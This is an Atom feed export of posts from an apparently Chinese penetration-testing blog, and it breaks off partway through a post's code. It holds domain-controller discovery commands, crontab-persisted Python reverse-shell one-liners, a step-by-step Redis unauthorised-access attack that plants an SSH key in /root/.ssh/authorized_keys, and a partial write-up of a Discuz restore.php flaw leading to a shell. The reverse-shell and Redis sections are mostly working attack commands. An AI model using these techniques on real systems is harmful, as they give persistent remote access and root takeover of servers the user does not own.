    
    <content type="html">&lt;h2 id=&quot;0x00-Find-Domain-Controller-via-DNS&quot;&gt;&lt;a href=&quot;#0x00-Find-Domain-Controller-via-DNS&quot; class=&quot;headerlink&quot; title=&quot;0x00 Find Domain Controller via DNS&quot;&gt;&lt;/a&gt;0x00 Find Domain Controller via DNS&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.netspi.com/5-ways-to-find-systems-running-domain-admin-processes/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://blog.netspi.com/5-ways-to-find-systems-running-domain-admin-processes/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;DC may be  the default DNS server.&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;C:\Users\dm1&amp;gt;nslookup -type=SRV _ldap._tcp&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;DNS request timed out.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    timeout was 2 seconds.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;服务器:  UnKnown&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Address:  192.168.72.134&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;_ldap._tcp.corp.sm.com  SRV service location:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          priority       = 0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          weight         = 100&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          port           = 389&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          svr hostname   = win-dc.corp.sm.com&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;win-dc.corp.sm.com      internet address = 192.168.72.134&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;or ifconfig.&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;ifconfig /all&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;0x01-dsquery-with-Windows-2003&quot;&gt;&lt;a href=&quot;#0x01-dsquery-with-Windows-2003&quot; class=&quot;headerlink&quot; title=&quot;0x01 dsquery with Windows 2003&quot;&gt;&lt;/a&gt;0x01 dsquery with Windows 2003&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;dsquery computer&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;0x02-net-group&quot;&gt;&lt;a href=&quot;#0x02-net-group&quot; class=&quot;headerlink&quot; title=&quot;0x02 net group&quot;&gt;&lt;/a&gt;0x02 net group&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;net group &amp;quot;Domain Controllers&amp;quot; /domain&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;0x03-net-time&quot;&gt;&lt;a href=&quot;#0x03-net-time&quot; class=&quot;headerlink&quot; title=&quot;0x03 net time&quot;&gt;&lt;/a&gt;0x03 net time&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;net time /domain&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-Find-Domain-Controller-via-DNS&quot;&gt;&lt;a href=&quot;#0x00-Find-Domain-Controller-via-DNS&quot; class=&quot;headerlink&quot; title=&quot;0x00 Find Domain Contr
    
    </summary>
    
      <category term="web" scheme="http://blog.smilent.me/categories/web/"/>
    
    
      <category term="Pentest" scheme="http://blog.smilent.me/tags/Pentest/"/>
    
      <category term="Domain" scheme="http://blog.smilent.me/tags/Domain/"/>
    
      <category term="DC" scheme="http://blog.smilent.me/tags/DC/"/>
    
  </entry>
  
  <entry>
    <title>Linux crontab back Shell</title>
    <link href="http://blog.smilent.me/2016-05-25-linux-crontab-rebound-shell-hole.html"/>
    <id>http://blog.smilent.me/2016-05-25-linux-crontab-rebound-shell-hole.html</id>
    <published>2016-05-24T16:00:00.000Z</published>
    <updated>2016-06-03T10:27:19.000Z</updated>
    
    <content type="html">&lt;h3 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h3&gt;&lt;p&gt;今天测试docker remote api未授权访问漏洞的时候，在ubuntu上使用&lt;code&gt;bash&lt;/code&gt;反弹shell，一直不成功。查看&lt;code&gt;/var/log/syslog&lt;/code&gt;&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;http://joychou.org/usr/uploads/2016/05/1700093592.png&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;
&lt;p&gt;图中圈出来的内容，表示执行该定时任务的时候报错，报错信息无法输出&lt;/p&gt;
&lt;p&gt;所以很惊讶为什么不能够成功，不管是&lt;code&gt;/etc/crontab&lt;/code&gt;还是&lt;code&gt;/var/spool/cron/crontabs/&lt;/code&gt;&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;br&gt;所以有了下面的内容&lt;/p&gt;
&lt;p&gt;测试环境：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ubuntu 14.04&lt;/li&gt;
&lt;li&gt;centos 6.5&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;0x01-1号坑（ubuntu不能使用bash反弹shell）&quot;&gt;&lt;a href=&quot;#0x01-1号坑（ubuntu不能使用bash反弹shell）&quot; class=&quot;headerlink&quot; title=&quot;0x01 1号坑（ubuntu不能使用bash反弹shell）&quot;&gt;&lt;/a&gt;0x01 1号坑（ubuntu不能使用&lt;code&gt;bash&lt;/code&gt;反弹shell）&lt;/h3&gt;&lt;p&gt;可能大家平时比较少人ubuntu，所以不大知道这个特性&lt;/p&gt;
&lt;p&gt;今天让几个朋友测试了，结果是：&lt;br&gt;&lt;code&gt;/etc/crontab&lt;/code&gt;和&lt;code&gt;/var/spool/cron/crontabs/&lt;/code&gt;，&lt;code&gt;bash -i&lt;/code&gt;反弹shell都失败&lt;/p&gt;
&lt;p&gt;但是python可以，而且现在centos和ubuntu基本都自带python&lt;/p&gt;
&lt;p&gt;执行以下命令，以当前bash权限用户，创建一个crontab文件&lt;br&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;(crontab &lt;span class=&quot;_&quot;&gt;-l&lt;/span&gt;;&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;* * * * *  /usr/bin/python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;127.0.0.1\&quot;,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#39;\n&quot;&lt;/span&gt;)|crontab -&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;crontab -&lt;/code&gt;将管道符前面的内容写入到当前用户的crontab文件里&lt;/p&gt;
&lt;p&gt;&lt;code&gt;* * * * *&lt;/code&gt;表示每一分钟执行该命令，等同于&lt;code&gt;*/1 * * * *&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;如果是ubuntu的root权限，写到&lt;code&gt;/var/spool/cron/crontabs/root&lt;/code&gt;文件&lt;br&gt;如果是centos的root权限，写到&lt;code&gt;/var/spool/cron/root&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;执行成功后，相应的文件创建或者追加如下内容&lt;br&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;* * * * *  /usr/bin/python -c &lt;span class=&quot;string&quot;&gt;&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&quot;0x02-2号坑（ubuntu用户的定时任务在-var-spool-cron-crontabs-目录下）&quot;&gt;&lt;a href=&quot;#0x02-2号坑（ubuntu用户的定时任务在-var-spool-cron-crontabs-目录下）&quot; class=&quot;headerlink&quot; title=&quot;0x02 2号坑（ubuntu用户的定时任务在/var/spool/cron/crontabs/目录下）&quot;&gt;&lt;/a&gt;0x02 2号坑（ubuntu用户的定时任务在&lt;code&gt;/var/spool/cron/crontabs/&lt;/code&gt;目录下）&lt;/h3&gt;&lt;p&gt;之前，一直误认为所有linux系统用户的定时任务都在&lt;code&gt;/var/spool/cron/&lt;/code&gt;目录下&lt;/p&gt;
&lt;p&gt;其实是我自以为，人最怕只以为是……&lt;/p&gt;
&lt;p&gt;现在回想起来，终于可以解释之前写的hackredis.py中，为何有时不能创建&lt;code&gt;/root/.ssh/&lt;/code&gt;目录&lt;/p&gt;
&lt;p&gt;因为代码中我写的crontab文件固定，是&lt;code&gt;/var/spool/cron/root&lt;/code&gt;，导致在ubuntu系统中，定时任务未能成功创建&lt;/p&gt;
&lt;h3 id=&quot;0x03-总结&quot;&gt;&lt;a href=&quot;#0x03-总结&quot; class=&quot;headerlink&quot; title=&quot;0x03 总结&quot;&gt;&lt;/a&gt;0x03 总结&lt;/h3&gt;&lt;p&gt;如果只能写文件，想反弹shell通用（比如redis未授权访问）&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;写&lt;code&gt;/etc/crontab&lt;/code&gt;文件&lt;/li&gt;
&lt;li&gt;使用python反弹shell的脚本&lt;br&gt;如果可以执行命令，想反弹shell通用（比如docker remote api未授权访问)&lt;/li&gt;
&lt;li&gt;写当前用户下的crontab 或者写&lt;code&gt;/etc/crontab&lt;/code&gt;也可以&lt;/li&gt;
&lt;li&gt;使用python反弹shell的脚本&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;写当前用户下的crontab：&lt;br&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;(crontab &lt;span class=&quot;_&quot;&gt;-l&lt;/span&gt;;&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;* * * * *  /usr/bin/python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;127.0.0.1\&quot;,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#39;\n&quot;&lt;/span&gt;)|crontab -&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;写/etc/crontab：&lt;br&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;* * * * * root /usr/bin/python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;127.0.0.1\&quot;,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#39;&quot;&lt;/span&gt; &amp;gt;&amp;gt; /etc/crontab&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;原文:&lt;a href=&quot;http://joychou.org/index.php/web/linux-crontab-rebound-shell-hole.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;JoyChou&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h3&gt;&lt;p&gt;今天测试docker remote api未授权访问漏洞的时候，在ubuntu上使用&lt;code&gt;bash&lt;/code&gt;反弹shell，一直不成功。查看&lt;code&gt;/var/log/syslog&lt;/code&gt;&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;http://joychou.org/usr/uploads/2016/05/1700093592.png&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;
&lt;p&gt;图中圈出来的内容，表示执行该定时任务的时候报错，报错信息无法输出&lt;/p&gt;
&lt;p&gt;所以很惊讶为什么不能够成功，不管是&lt;code&gt;/etc/crontab&lt;/code&gt;还是&lt;code&gt;/var/spool/cron/crontabs/&lt;/code&gt;&lt;br&gt;
    
    </summary>
    
      <category term="web" scheme="http://blog.smilent.me/categories/web/"/>
    
    
      <category term="Linux" scheme="http://blog.smilent.me/tags/Linux/"/>
    
      <category term="Shell" scheme="http://blog.smilent.me/tags/Shell/"/>
    
  </entry>
  
  <entry>
    <title>Redis vulnerability via SSH authorized_keys</title>
    <link href="http://blog.smilent.me/2015-11-10-redis-vulnerability-via-ssh-authorized-keys.html"/>
    <id>http://blog.smilent.me/2015-11-10-redis-vulnerability-via-ssh-authorized-keys.html</id>
    <published>2015-11-09T16:00:00.000Z</published>
    <updated>2016-06-03T09:19:59.000Z</updated>
    
    <content type="html">&lt;h3 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h3&gt;&lt;p&gt;配置错误的Redis可通过将公钥写入.ssh/authorized_keys，使攻击者拿到服务器权限。&lt;/p&gt;
&lt;h3 id=&quot;0x01-测试环境&quot;&gt;&lt;a href=&quot;#0x01-测试环境&quot; class=&quot;headerlink&quot; title=&quot;0x01 测试环境&quot;&gt;&lt;/a&gt;0x01 测试环境&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;victim server CentOS6.6+redis2.4  192.168.192.133&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;attack server CentOS6.6  192.168.192.132&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;先在attack server生成一个公钥&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;ssh-keygen -t rsa -C &amp;quot;redis&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;(echo -e &amp;quot;\n\n&amp;quot;; cat redis.pub; echo -e &amp;quot;\n\n&amp;quot;) &amp;gt; redis.txt&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;然后执行&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;redis-cli -h 192.168.192.133 flushall&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;cat redis.txt | redis-cli -h 192.168.192.133 -x set pwn&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;登录redis  redis-cli -h 192.168.192.133&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;CONFIG set dir /root/.ssh/&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;config set dbfilename &amp;quot;authorized_keys&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;save&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;exit&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;然后就可以使用ssh的公钥登录了&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;ssh -i redis.pub root@192.168.192.133&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&quot;0x02-不存在-ssh目录&quot;&gt;&lt;a href=&quot;#0x02-不存在-ssh目录&quot; class=&quot;headerlink&quot; title=&quot;0x02 不存在.ssh目录&quot;&gt;&lt;/a&gt;0x02 不存在.ssh目录&lt;/h3&gt;&lt;p&gt;当目标服务器上不存在.ssh目录时，Redis是无法创建该目录的，所以可以通过写入crontab的方式来达到命令执行，并反弹shell。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h3&gt;&lt;p&gt;配置错误的Redis可通过将公钥写入.ssh/authorized_keys，使攻击者拿到服务器权限
    
    </summary>
    
      <category term="web" scheme="http://blog.smilent.me/categories/web/"/>
    
    
      <category term="Redis" scheme="http://blog.smilent.me/tags/Redis/"/>
    
      <category term="Linux" scheme="http://blog.smilent.me/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Discuz restore vulnerability</title>
    <link href="http://blog.smilent.me/2015-10-16-discuz-utility-restore-vulnerability.html"/>
    <id>http://blog.smilent.me/2015-10-16-discuz-utility-restore-vulnerability.html</id>
    <published>2015-10-15T16:00:00.000Z</published>
    <updated>2016-06-04T04:07:27.000Z</updated>
    
    <content type="html">&lt;h3 id=&quot;0x00-简介&quot;&gt;&lt;a href=&quot;#0x00-简介&quot; class=&quot;headerlink&quot; title=&quot;0x00 简介&quot;&gt;&lt;/a&gt;0x00 简介&lt;/h3&gt;&lt;p&gt;restore.php 是discuz官方提供的数据恢复，该工具中存在一个可以恢复任意sql文件的漏洞，从而可以造成插入ucenter管理员帐户，获取uckey，甚至getshell的情况。&lt;br&gt;&lt;img src=&quot;http://smilent-typecho.stor.sinaapp.com/1152864778.png&quot; alt=&quot;d1.png&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;0x01-漏洞原理&quot;&gt;&lt;a href=&quot;#0x01-漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞原理&quot;&gt;&lt;/a&gt;0x01 漏洞原理&lt;/h3&gt;&lt;p&gt;漏洞出现在&lt;br&gt;&lt;a href=&quot;http://localhost/utility/restore.php?operation=importzip&amp;amp;datafile_server={file_path}&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://localhost/utility/restore.php?operation=importzip&amp;amp;datafile_server={file_path}&lt;/a&gt;&lt;br&gt;文件&lt;code&gt;/utility/restore.php&lt;/code&gt; 142 行开始，importzip 逻辑中。&lt;br&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//line 157&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;$backupdir = substr($datafile_server, &lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;13&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//....&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// line 173 &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;foreach&lt;/span&gt;($unzip-&amp;gt;Entries &lt;span class=&quot;keyword&quot;&gt;as&lt;/span&gt; $entry) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(preg_match(&lt;span class=&quot;string&quot;&gt;&quot;/\.sql$/i&quot;&lt;/span&gt;, $entry-&amp;gt;Name)) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;			$fp = fopen(&lt;span class=&quot;string&quot;&gt;&#39;../data/&#39;&lt;/span&gt;.$backupdir.&lt;span class=&quot;string&quot;&gt;&#39;/&#39;&lt;/span&gt;.$entry-&amp;gt;Name, &lt;span class=&quot;string&quot;&gt;&#39;w&#39;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;			var_dump($fp);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;			fwrite($fp, $entry-&amp;gt;Data);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;			fclose($fp);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;			$sqlfilecount++;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//....&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//line 118&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;show_msg(&lt;span class=&quot;string&quot;&gt;&#39;database_import_multivol_confirm&#39;&lt;/span&gt;, $siteurl.&lt;span 